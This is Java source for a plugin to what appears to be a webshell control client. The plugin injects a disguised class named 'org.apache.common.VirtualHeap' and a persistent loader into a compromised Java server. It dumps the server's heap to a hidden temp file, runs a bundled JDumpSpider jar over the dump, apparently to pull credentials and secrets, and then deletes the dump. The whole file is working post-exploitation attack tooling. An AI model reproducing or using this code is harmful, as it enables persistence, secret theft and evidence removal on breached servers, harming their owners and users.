package shells.plugins.evalexp;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import util.automaticBindClick;
import util.http.ReqParameter;
import javax.swing.*;
import java.awt.*;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;

@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "HeapDump", DisplayName = "HeapDump")
public class HeapDumpPlugin implements Plugin {
    private JPanel panel;
    private ShellEntity entity;
    private Payload payload;
    private Encoding encoding;
    private Map<String, Boolean> loadState = new HashMap<>();
    private boolean isPersit = false;

    private static final String CLASS_NAME = "org.apache.common.VirtualHeap";

    @Override
    public void init(ShellEntity shellEntity) {
        this.entity = shellEntity;
        this.payload = entity.getPayloadModule();
        this.encoding = entity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this, this);
        this.setupUI();
    }

    private boolean load(String className) {
        if (loadState.containsKey(className) && loadState.get(className)) {
            return true;
        }
        try {
            byte[] bc = getByteCode(className.replace(".", "/") + ".class");
            boolean state = this.payload.include(className, bc);
            loadState.put(className, state);
            return state;
        } catch (Exception e) {
            GOptionPane.showMessageDialog(this.panel, "Error", "Load core failed", JOptionPane.ERROR_MESSAGE);
            return false;
        }
    }

    private boolean persitLoader() {
        if (!this.load(CLASS_NAME)) return false;
        if (isPersit) return true;
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("loader", getByteCode("org/apache/common/hotspot/HotSpotLoader.class"));
        String result = encoding.Decoding(payload.evalFunc(CLASS_NAME, "persitLoader", reqParameter));
        if (result.contains("[!]")) {
            GOptionPane.showMessageDialog(this.panel, "Loader load failed: \n"+ result, "Error", JOptionPane.ERROR_MESSAGE);
            return false;
        } else {
            isPersit = true;
            GOptionPane.showMessageDialog(this.panel, "Loader loaded", "Success", JOptionPane.INFORMATION_MESSAGE);
            return true;
        }
    }

    private byte[] getByteCode(String path) {
        InputStream inputStream = this.getClass().getResourceAsStream("/" + path);
        System.out.println("Input stream: " + inputStream);
        return util.functions.readInputStream(inputStream);
    }

    private void setupUI() {
        panel = new JPanel(new BorderLayout());
        JPanel functionPanel = new JPanel();
        JLabel label = new JLabel("Heap Dump Location: ");
        JTextField textField = new JTextField(50);
        if (payload.isWindows()) {
            textField.setText("C:/Users/Public/heapdump.hprof");
        } else {
            textField.setText("/tmp/.heapdump.hprof");
        }
        JButton heapDumpButton = new JButton("Heap Dump");
        JCheckBox withSpider = new JCheckBox("With Spider");
        JCheckBox delete = new JCheckBox("Delete After Spider");
        withSpider.addActionListener(e -> {
            delete.setEnabled(withSpider.isSelected() && !payload.isWindows());
            if (!withSpider.isSelected()) {
                heapDumpButton.setEnabled(true);
            } else {
                heapDumpButton.setEnabled(isPersit);
            }
        });
        if (!payload.isWindows()) {
            withSpider.setSelected(true);
            delete.setSelected(true);
        } else delete.setEnabled(false);
        JTextArea resultTextArea = new JTextArea();
        resultTextArea.setEditable(false);
        resultTextArea.setLineWrap(true);
        resultTextArea.setWrapStyleWord(true);
        JScrollPane scrollPane = new JScrollPane(resultTextArea);
        JButton loadButton = new JButton("Load");
        loadButton.addActionListener(e -> {
            if (persitLoader()) {
                loadButton.setEnabled(false);
                loadButton.setText("Loaded");
                heapDumpButton.setEnabled(true);
            }
        });
        heapDumpButton.addActionListener(e -> {
            if (load(CLASS_NAME) && persitLoader()) {
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("loc", textField.getText());
                String methodName = "dumpHeap";
                if (withSpider.isSelected()) {
                    if (payload.isWindows()) {
                        int op = GOptionPane.showConfirmDialog(this.panel, "Target system is windows, use spider might create temp folder and this folder would BE LOCKED(CAN'T BE DELETED). If you still want to use Spider, you need to clean dump file yourself. Press OK if you still want to use spider.", "Warning", JOptionPane.OK_CANCEL_OPTION);
                        if (op == GOptionPane.CANCEL_OPTION) {
                            return ;
                        }
                    }
                    reqParameter.add("jar", getByteCode("JDumpSpider-1.1-SNAPSHOT-full.jar"));
                    methodName += ",spider";
                }
                if (delete.isSelected() && withSpider.isSelected() && !payload.isWindows()) {
                    methodName += ",delete";
                }
                String result = encoding.Decoding(payload.evalFunc(CLASS_NAME, methodName, reqParameter));
                if (result.contains("[!]")) {
                    resultTextArea.setText("Heap Dump failed: \n" + result);
                } else {
                    resultTextArea.setText("Heap Dump succeeded: \n" + result);
                }
            }
        });
        functionPanel.add(label);
        functionPanel.add(textField);
        functionPanel.add(withSpider);
        functionPanel.add(delete);
        functionPanel.add(loadButton);
        functionPanel.add(heapDumpButton);
        panel.add(functionPanel, BorderLayout.NORTH);
        panel.add(scrollPane, BorderLayout.CENTER);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}
